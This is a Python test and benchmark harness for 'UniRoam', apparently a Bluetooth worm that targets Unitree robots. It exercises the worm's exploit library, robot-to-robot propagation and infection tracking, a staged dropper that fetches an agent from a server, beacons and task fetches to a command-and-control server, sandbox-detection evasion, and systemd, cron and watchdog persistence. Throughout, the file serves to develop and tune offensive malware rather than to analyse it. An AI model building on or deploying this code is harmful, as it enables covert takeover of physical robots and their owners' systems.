#!/usr/bin/env python3
"""
Worm Testing Framework
Controlled test environment for worm behavior analysis
"""

import asyncio
import sys
import time
import json
from datetime import datetime
from typing import List, Dict
from pathlib import Path
import unittest

from uniroam import config
from uniroam.exploit_lib import create_packet, validate_response, encrypt_data, decrypt_data
from uniroam.propagation_engine import InfectionTracker, NetworkScanner, WormPropagator
from uniroam.persistence import PersistenceManager
from uniroam.payload_builder import PayloadManager, PayloadTester
from uniroam.opsec_utils import TrafficEncryption, TimingEvasion, AntiForensics

# ============================================================================
# Mock BLE Device
# ============================================================================

class MockBLEDevice:
    """Mock BLE device for testing"""
    
    def __init__(self, name: str, address: str):
        self.name = name
        self.address = address
        self.rssi = -60

# ============================================================================
# Simulated Robot Environment
# ============================================================================

class SimulatedRobotEnvironment:
    """Simulate multiple robots for propagation testing"""
    
    def __init__(self, num_robots: int = 5):
        """
        Initialize simulated environment
        
        Args:
            num_robots: Number of robots to simulate
        """
        self.robots = []
        self.infected_robots = set()
        
        for i in range(num_robots):
            model = config.SUPPORTED_MODELS[i % len(config.SUPPORTED_MODELS)]
            robot = MockBLEDevice(
                name=f"{model}SIM_{i:04d}",
                address=f"AA:BB:CC:DD:EE:{i:02X}"
            )
            self.robots.append(robot)
    
    def get_nearby_robots(self, current_robot: str = None, range_limit: int = 3) -> List:
        """
        Get robots within BLE range
        
        Args:
            current_robot: Address of current robot
            range_limit: Max number of nearby robots
        
        Returns:
            List of nearby robots
        """
        # Simulate range by returning subset
        available = [r for r in self.robots if r.address != current_robot]
        return available[:range_limit]
    
    def mark_infected(self, robot_address: str):
        """Mark robot as infected"""
        self.infected_robots.add(robot_address)
    
    def get_infection_rate(self) -> float:
        """Get current infection rate"""
        return len(self.infected_robots) / len(self.robots)

# ============================================================================
# Unit Tests
# ============================================================================

class TestExploitLib(unittest.TestCase):
    """Test exploit library functions"""
    
    def test_encryption_decryption(self):
        """Test AES encryption/decryption"""
        test_data = b"Test packet data"
        encrypted = encrypt_data(test_data)
        decrypted = decrypt_data(encrypted)
        self.assertEqual(test_data, decrypted)
    
    def test_packet_creation(self):
        """Test packet construction"""
        packet = create_packet(instruction=1, data_bytes=[0, 0, 0x75, 0x6e, 0x69, 0x74, 0x72, 0x65, 0x65])
        self.assertIsInstance(packet, bytes)
        self.assertGreater(len(packet), 0)
    
    def test_response_validation(self):
        """Test response validation"""
        # Valid response
        valid_response = bytes([0x51, 0x05, 0x01, 0x01, 0xA8])
        self.assertTrue(validate_response(valid_response, expected_instruction=1))
        
        # Invalid opcode
        invalid_response = bytes([0x52, 0x05, 0x01, 0x01, 0xA7])
        self.assertFalse(validate_response(invalid_response, expected_instruction=1))

class TestPropagationEngine(unittest.TestCase):
    """Test propagation engine"""
    
    def setUp(self):
        """Clean up test files before each test"""
        import os
        test_files = [
            config.INFECTION_HISTORY_PATH,
            config.INFECTION_BLACKLIST_PATH
        ]
        for f in test_files:
            if os.path.exists(f):
                os.remove(f)
    
    def tearDown(self):
        """Clean up test files after each test"""
        import os
        test_files = [
            config.INFECTION_HISTORY_PATH,
            config.INFECTION_BLACKLIST_PATH
        ]
        for f in test_files:
            if os.path.exists(f):
                os.remove(f)
    
    def test_infection_tracker(self):
        """Test infection tracking"""
        tracker = InfectionTracker()
        
        # Test infection marking
        tracker.mark_infected("AA:BB:CC:DD:EE:01")
        self.assertTrue(tracker.is_infected("AA:BB:CC:DD:EE:01"))
        self.assertFalse(tracker.is_infected("AA:BB:CC:DD:EE:02"))
        
        # Test failure tracking
        tracker.mark_failed("AA:BB:CC:DD:EE:03")
        tracker.mark_failed("AA:BB:CC:DD:EE:03")
        tracker.mark_failed("AA:BB:CC:DD:EE:03")
        self.assertTrue(tracker.is_blacklisted("AA:BB:CC:DD:EE:03"))
    
    def test_rate_limiting(self):
        """Test rate limiting"""
        tracker = InfectionTracker()
        
        # Simulate rapid infections
        for i in range(config.PROPAGATION_RATE_LIMIT + 1):
            tracker.mark_infected(f"AA:BB:CC:DD:EE:{i:02X}")
        
        self.assertTrue(tracker.should_rate_limit())

class TestPayloadBuilder(unittest.TestCase):
    """Test payload builder"""
    
    def test_dropper_generation(self):
        """Test Stage 0 dropper"""
        from uniroam.payload_builder import Stage0Builder
        
        dropper = Stage0Builder.build_dropper("http://test.local", "robot_123")
        self.assertIn("python3", dropper)
        self.assertIn("test.local", dropper)
        self.assertLess(len(dropper), 500)  # Should be minimal
    
    def test_payload_encryption(self):
        """Test payload encryption"""
        from uniroam.payload_builder import PayloadEncryption
        
        test_payload = b"Test payload data"
        encrypted = PayloadEncryption.encrypt_payload(test_payload)
        decrypted = PayloadEncryption.decrypt_payload(encrypted)
        self.assertEqual(test_payload, decrypted)

class TestOpSec(unittest.TestCase):
    """Test OpSec utilities"""
    
    def test_traffic_encryption(self):
        """Test traffic encryption"""
        msg = b"C2 beacon data"
        encrypted = TrafficEncryption.encrypt_message(msg)
        decrypted = TrafficEncryption.decrypt_message(encrypted)
        self.assertEqual(msg, decrypted)
    
    def test_sandbox_detection(self):
        """Test sandbox detection"""
        is_sandbox = TimingEvasion.is_analysis_environment()
        self.assertIsInstance(is_sandbox, bool)

# ============================================================================
# Integration Tests
# ============================================================================

class TestPropagationSimulation:
    """Test propagation in simulated environment"""
    
    def __init__(self):
        self.env = SimulatedRobotEnvironment(num_robots=10)
        self.results = []
    
    async def simulate_propagation(self, duration: int = 60):
        """
        Simulate worm propagation
        
        Args:
            duration: Simulation duration in seconds
        """
        print(f"[+] Starting propagation simulation ({duration}s)...")
        print(f"[+] Environment: {len(self.env.robots)} robots")
        
        tracker = InfectionTracker()
        start_time = time.time()
        
        # Infect first robot (patient zero)
        patient_zero = self.env.robots[0]
        self.env.mark_infected(patient_zero.address)
        tracker.mark_infected(patient_zero.address)
        
        print(f"[+] Patient zero: {patient_zero.name} ({patient_zero.address})")
        
        iteration = 0
        while time.time() - start_time < duration:
            iteration += 1
            
            # Each infected robot attempts to infect nearby robots
            newly_infected = []
            
            for robot in self.env.robots:
                if robot.address in self.env.infected_robots:
                    # This robot is infected, try to spread
                    nearby = self.env.get_nearby_robots(robot.address, range_limit=2)
                    
                    for target in nearby:
                        if not tracker.is_infected(target.address):
                            # Simulate infection attempt (70% success rate)
                            import random
                            if random.random() < 0.7:
                                self.env.mark_infected(target.address)
                                tracker.mark_infected(target.address)
                                newly_infected.append(target.name)
                            else:
                                tracker.mark_failed(target.address)
            
            if newly_infected:
                print(f"[+] Iteration {iteration}: Infected {len(newly_infected)} robots: {', '.join(newly_infected)}")
                self.results.append({
                    'iteration': iteration,
                    'newly_infected': len(newly_infected),
                    'total_infected': len(self.env.infected_robots),
                    'infection_rate': self.env.get_infection_rate()
                })
            
            # Check if all robots infected
            if self.env.get_infection_rate() >= 1.0:
                print(f"[+] Full infection achieved in {iteration} iterations!")
                break
            
            await asyncio.sleep(5)  # Simulate time between infection attempts
        
        # Final stats
        print(f"\n[+] Simulation complete:")
        print(f"    Duration: {time.time() - start_time:.1f}s")
        print(f"    Iterations: {iteration}")
        print(f"    Infected: {len(self.env.infected_robots)}/{len(self.env.robots)}")
        print(f"    Infection rate: {self.env.get_infection_rate():.1%}")
    
    def save_results(self, filename: str = "test_results/propagation_simulation.json"):
        """Save simulation results"""
        Path(filename).parent.mkdir(exist_ok=True)
        
        with open(filename, 'w') as f:
            json.dump({
                'timestamp': datetime.now().isoformat(),
                'total_robots': len(self.env.robots),
                'final_infected': len(self.env.infected_robots),
                'infection_rate': self.env.get_infection_rate(),
                'iterations': self.results
            }, f, indent=2)
        
        print(f"[+] Results saved to {filename}")

# ============================================================================
# Benchmarking
# ============================================================================

class WormBenchmark:
    """Benchmark worm performance"""
    
    @staticmethod
    def benchmark_encryption(iterations: int = 1000):
        """Benchmark encryption performance"""
        print(f"\n[+] Benchmarking encryption ({iterations} iterations)...")
        
        test_data = b"A" * 100  # 100 bytes
        
        start = time.time()
        for _ in range(iterations):
            encrypted = encrypt_data(test_data)
            decrypted = decrypt_data(encrypted)
        elapsed = time.time() - start
        
        ops_per_sec = iterations / elapsed
        print(f"    Encrypt/Decrypt: {ops_per_sec:.0f} ops/sec")
        print(f"    Time per operation: {elapsed/iterations*1000:.2f} ms")
    
    @staticmethod
    def benchmark_packet_creation(iterations: int = 1000):
        """Benchmark packet creation"""
        print(f"\n[+] Benchmarking packet creation ({iterations} iterations)...")
        
        start = time.time()
        for i in range(iterations):
            packet = create_packet(instruction=1, data_bytes=[0, 0] + list(b"unitree"))
        elapsed = time.time() - start
        
        ops_per_sec = iterations / elapsed
        print(f"    Packet creation: {ops_per_sec:.0f} ops/sec")
        print(f"    Time per packet: {elapsed/iterations*1000:.2f} ms")
    
    @staticmethod
    def benchmark_payload_generation(iterations: int = 100):
        """Benchmark payload generation"""
        print(f"\n[+] Benchmarking payload generation ({iterations} iterations)...")
        
        payload_manager = PayloadManager("http://test.local:8443")
        
        start = time.time()
        for _ in range(iterations):
            payload = payload_manager.generate_injection_command("robot_test")
        elapsed = time.time() - start
        
        if elapsed > 0:
            ops_per_sec = iterations / elapsed
            print(f"    Payload generation: {ops_per_sec:.0f} ops/sec")
        else:
            print(f"    Payload generation: Too fast to measure (< 0.001s for {iterations} iterations)")
    
    @staticmethod
    def run_all_benchmarks():
        """Run all benchmarks"""
        print("="*60)
        print("Worm Performance Benchmarks")
        print("="*60)
        
        WormBenchmark.benchmark_encryption()
        WormBenchmark.benchmark_packet_creation()
        WormBenchmark.benchmark_payload_generation()
        
        print("\n" + "="*60)

# ============================================================================
# C2 Server Tests
# ============================================================================

class TestC2Integration:
    """Test C2 server integration"""
    
    def __init__(self):
        self.c2_url = "http://localhost:8443"
    
    async def test_c2_connection(self):
        """Test connection to C2 server"""
        import aiohttp
        
        print("[+] Testing C2 connection...")
        
        try:
            async with aiohttp.ClientSession() as session:
                # Test beacon endpoint
                beacon_data = {
                    'robot_id': 'TEST_ROBOT_001',
                    'timestamp': datetime.now().isoformat(),
                    'status': 'active'
                }
                
                async with session.post(
                    f"{self.c2_url}/api/v1/beacon",
                    json=beacon_data,
                    headers={'X-API-Key': config.C2_API_KEY}
                ) as resp:
                    if resp.status == 200:
                        print("    ✓ C2 beacon successful")
                        return True
                    else:
                        print(f"    ✗ C2 beacon failed: {resp.status}")
                        return False
        
        except Exception as e:
            print(f"    ✗ C2 connection failed: {e}")
            return False
    
    async def test_task_retrieval(self):
        """Test task retrieval from C2"""
        import aiohttp
        
        print("[+] Testing task retrieval...")
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"{self.c2_url}/api/v1/tasks/TEST_ROBOT_001",
                    headers={'X-API-Key': config.C2_API_KEY}
                ) as resp:
                    if resp.status == 200:
                        tasks = await resp.json()
                        print(f"    ✓ Retrieved {len(tasks)} tasks")
                        return True
                    else:
                        print(f"    ✗ Task retrieval failed: {resp.status}")
                        return False
        
        except Exception as e:
            print(f"    ✗ Task retrieval failed: {e}")
            return False

# ============================================================================
# Test Suite Runner
# ============================================================================

class TestSuiteRunner:
    """Run complete test suite"""
    
    @staticmethod
    def run_unit_tests():
        """Run all unit tests"""
        print("="*60)
        print("Unit Tests")
        print("="*60)
        
        loader = unittest.TestLoader()
        suite = unittest.TestSuite()
        
        # Add test classes
        suite.addTests(loader.loadTestsFromTestCase(TestExploitLib))
        suite.addTests(loader.loadTestsFromTestCase(TestPropagationEngine))
        suite.addTests(loader.loadTestsFromTestCase(TestPayloadBuilder))
        suite.addTests(loader.loadTestsFromTestCase(TestOpSec))
        
        runner = unittest.TextTestRunner(verbosity=2)
        result = runner.run(suite)
        
        return result.wasSuccessful()
    
    @staticmethod
    async def run_integration_tests():
        """Run integration tests"""
        print("\n" + "="*60)
        print("Integration Tests")
        print("="*60)
        
        # Test propagation simulation
        sim = TestPropagationSimulation()
        await sim.simulate_propagation(duration=30)
        sim.save_results()
        
        # Test C2 integration (if C2 server is running)
        c2_test = TestC2Integration()
        await c2_test.test_c2_connection()
        await c2_test.test_task_retrieval()
    
    @staticmethod
    async def run_all_tests():
        """Run complete test suite"""
        print("""
╔══════════════════════════════════════════════╗
║         UniRoam Test Suite v1.0              ║
║   Comprehensive Testing Framework            ║
╚══════════════════════════════════════════════╝
        """)
        
        # Unit tests
        unit_success = TestSuiteRunner.run_unit_tests()
        
        # Benchmarks
        WormBenchmark.run_all_benchmarks()
        
        # Payload tests
        print("\n" + "="*60)
        print("Payload Tests")
        print("="*60)
        PayloadTester.run_all_tests()
        
        # Integration tests
        await TestSuiteRunner.run_integration_tests()
        
        print("\n" + "="*60)
        print(f"Test suite completed: {'PASS' if unit_success else 'FAIL'}")
        print("="*60)

# ============================================================================
# Standalone Test Functions
# ============================================================================

async def test_simulated_propagation():
    """Run standalone propagation simulation"""
    sim = TestPropagationSimulation()
    await sim.simulate_propagation(duration=60)
    sim.save_results()

def test_payload_generation():
    """Test payload generation"""
    print("="*60)
    print("Payload Generation Test")
    print("="*60)
    
    manager = PayloadManager("http://test.local:8443")
    
    print("\n[+] Stage 0 (Dropper):")
    stage0 = manager.generate_injection_command("test_robot_001")
    print(f"    Length: {len(stage0)} chars")
    print(f"    Payload: {stage0[:80]}...")
    
    print("\n[+] Stage 1 (Agent Downloader):")
    stage1 = manager.get_stage1_payload()
    print(f"    Length: {len(stage1)} bytes")
    
    print("\n[+] Installer Script:")
    installer = manager.get_installer_script()
    print(f"    Length: {len(installer)} bytes")
    
    print("\n" + "="*60)

def test_persistence():
    """Test persistence mechanisms (dry run)"""
    print("="*60)
    print("Persistence Mechanisms Test (Dry Run)")
    print("="*60)
    
    print("\n[+] Systemd service template:")
    from persistence import SystemdPersistence
    service = SystemdPersistence.create_service_file()
    print(service)
    
    print("\n[+] Cron entry:")
    from persistence import CronPersistence
    cron = CronPersistence.get_cron_entry()
    print(f"    {cron}")
    
    print("\n[+] Watchdog script:")
    from persistence import WatchdogPersistence
    watchdog = WatchdogPersistence.create_watchdog_script("/tmp/test_worm")
    print(watchdog[:200] + "...")
    
    print("\n" + "="*60)

# ============================================================================
# Main
# ============================================================================

def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Worm Testing Framework')
    parser.add_argument('--unit', action='store_true', help='Run unit tests only')
    parser.add_argument('--integration', action='store_true', help='Run integration tests only')
    parser.add_argument('--benchmark', action='store_true', help='Run benchmarks only')
    parser.add_argument('--simulate', action='store_true', help='Run propagation simulation')
    parser.add_argument('--payload', action='store_true', help='Test payload generation')
    parser.add_argument('--persistence', action='store_true', help='Test persistence mechanisms')
    parser.add_argument('--all', action='store_true', help='Run all tests')
    args = parser.parse_args()
    
    # Default to all if no specific test selected
    if not any([args.unit, args.integration, args.benchmark, args.simulate, 
                args.payload, args.persistence, args.all]):
        args.all = True
    
    try:
        if args.unit or args.all:
            TestSuiteRunner.run_unit_tests()
        
        if args.benchmark or args.all:
            WormBenchmark.run_all_benchmarks()
        
        if args.payload or args.all:
            test_payload_generation()
        
        if args.persistence or args.all:
            test_persistence()
        
        if args.simulate or args.all:
            asyncio.run(test_simulated_propagation())
        
        if args.integration:
            asyncio.run(TestSuiteRunner.run_integration_tests())
    
    except KeyboardInterrupt:
        print("\n[!] Tests interrupted")
    except Exception as e:
        print(f"\n[!] Test error: {e}")
        if config.DEBUG_MODE:
            raise

if __name__ == "__main__":
    main()

